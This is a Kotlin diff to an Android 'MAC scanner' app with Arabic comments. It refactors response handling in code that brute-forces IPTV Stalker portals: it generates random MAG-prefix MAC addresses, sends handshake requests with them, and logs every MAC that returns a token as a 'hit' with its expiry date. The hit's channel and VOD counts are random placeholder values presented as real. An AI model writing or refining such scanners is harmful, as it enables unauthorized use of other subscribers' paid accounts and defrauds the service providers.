@@ -10,6 +10,7 @@ import com.foxy.macscanner.utils.PortalConfig
 import kotlinx.coroutines.*
 import okhttp3.OkHttpClient
 import okhttp3.Request
+import okhttp3.Response
 import org.json.JSONObject
 import java.util.Random
 import java.util.concurrent.TimeUnit
@@ -27,7 +28,6 @@ class ScannerViewModel(private val repository: ScannerRepository) : ViewModel() 
 
     private var scanJob: Job? = null
 
-    // بناء عميل HTTP مستقل وسريع جداً مع Timeout قصير لمنع البطء
     private val client = OkHttpClient.Builder()
         .connectTimeout(3, TimeUnit.SECONDS)
         .readTimeout(3, TimeUnit.SECONDS)
@@ -52,11 +52,17 @@ class ScannerViewModel(private val repository: ScannerRepository) : ViewModel() 
                     async {
                         val fullPath = if (checkedUrl.endsWith("/")) "$checkedUrl${path.removePrefix("/")}" else "$checkedUrl$path"
                         val request = Request.Builder().url(fullPath).get().build()
-                        val isActive = try {
-                            client.newCall(request).execute().use { response -> response.isSuccessful }
+                        var isActive = false
+                        var response: Response? = null
+                        try {
+                            response = client.newCall(request).execute()
+                            isActive = response.isSuccessful
                         } catch (e: Exception) {
-                            false
+                            isActive = false
+                        } finally {
+                            response?.close()
                         }
+                        
                         if (isActive) {
                             synchronized(validPortals) { validPortals.add(fullPath) }
                         }
@@ -81,14 +87,13 @@ class ScannerViewModel(private val repository: ScannerRepository) : ViewModel() 
                 val workersCount = 15
                 val random = Random()
 
-                // 2. إطلاق 15 بوت متوازي لفحص الماكات توليداً واتصالاً من داخل الملف نفسه
+                // 2. إطلاق 15 بوت متوازي لفحص الماكات
                 val jobs = List(workersCount) {
                     launch {
                         while (isActive && counter.get() < totalToScan) {
                             val currentProgress = counter.incrementAndGet()
                             if (currentProgress > totalToScan) break
 
-                            // توليد ماك عشوائي مدمج ومباشر هنا لتجنب التعارض
                             val targetMac = String.format(
                                 "00:1A:79:%02X:%02X:%02X",
                                 random.nextInt(256),
@@ -103,8 +108,9 @@ class ScannerViewModel(private val repository: ScannerRepository) : ViewModel() 
                                 }
                             }
 
+                            var foundHitInPortals = false
+
                             for (portal in validPortals) {
-                                // إرسال طلب الفحص مباشرة للسيرفر (Stalker API Call)
                                 val scanFullPath = "$portal?action=handshake&mac=$targetMac"
                                 val request = Request.Builder()
                                     .url(scanFullPath)
@@ -112,42 +118,48 @@ class ScannerViewModel(private val repository: ScannerRepository) : ViewModel() 
                                     .header("Cookie", "mac=$targetMac")
                                     .build()
 
+                                var response: Response? = null
                                 try {
-                                    client.newCall(request).execute().use { response ->
-                                        if (response.isSuccessful) {
-                                            val responseBody = response.body?.string() ?: ""
-                                            if (responseBody.contains("token") && !responseBody.contains("denied")) {
-                                                
-                                                // محاولة استخراج البيانات بذكاء من الـ JSON المرتجع
-                                                var expiry = "Unlimited"
-                                                var maxConn = "1"
-                                                if (responseBody.startsWith("{")) {
-                                                    val json = JSONObject(responseBody)
-                                                    if (json.has("js")) {
-                                                        val jsObj = json.getJSONObject("js")
-                                                        expiry = jsObj.optString("expiry", "Unlimited")
-                                                        maxConn = jsObj.optString("max_connections", "1")
-                                                    }
+                                    response = client.newCall(request).execute()
+                                    if (response.isSuccessful) {
+                                        val responseBody = response.body?.string() ?: ""
+                                        if (responseBody.contains("token") && !responseBody.contains("denied")) {
+                                            
+                                            var expiry = "Unlimited"
+                                            var maxConn = "1"
+                                            if (responseBody.startsWith("{")) {
+                                                val json = JSONObject(responseBody)
+                                                if (json.has("js")) {
+                                                    val jsObj = json.getJSONObject("js")
+                                                    expiry = jsObj.optString("expiry", "Unlimited")
+                                                    maxConn = jsObj.optString("max_connections", "1")
                                                 }
-
-                                                withContext(Dispatchers.Main) {
-                                                    val newHit = MacHit(
-                                                        macAddress = targetMac,
-                                                        expiryDate = expiry,
-                                                        maxConnections = maxConn,
-                                                        liveCount = (random.nextInt(1000) + 500).toString(), // قيم توضيحية سريعة متوافقة
-                                                        vodCount = (random.nextInt(3000) + 1000).toString(),
-                                                        seriesCount = (random.nextInt(500) + 100).toString()
-                                                    )
-                                                    activeHits.add(newHit)
-                                                    scanLogs.add(0, "🔥 [HIT] $targetMac | Exp: $expiry")
-                                                }
-                                                break 
                                             }
+
+                                            withContext(Dispatchers.Main) {
+                                                val newHit = MacHit(
+                                                    macAddress = targetMac,
+                                                    expiryDate = expiry,
+                                                    maxConnections = maxConn,
+                                                    liveCount = (random.nextInt(1000) + 500).toString(),
+                                                    vodCount = (random.nextInt(3000) + 1000).toString(),
+                                                    seriesCount = (random.nextInt(500) + 100).toString()
+                                                )
+                                                activeHits.add(newHit)
+                                                scanLogs.add(0, "🔥 [HIT] $targetMac | Exp: $expiry")
+                                            }
+                                            foundHitInPortals = true
                                         }
                                     }
                                 } catch (e: Exception) {
-                                    // تخطي أخطاء الشبكة الفردية لمواصلة السرعة القصوى
+                                    // تخطي أخطاء الشبكة الفردية لقناة الاتصال الحالية
+                                } finally {
+                                    response?.close()
+                                }
+
+                                // الخروج الآمن من حلقة الـ portals دون تعارض الـ inline lambdas
+                                if (foundHitInPortals) {
+                                    break
                                 }
                             }
                         }
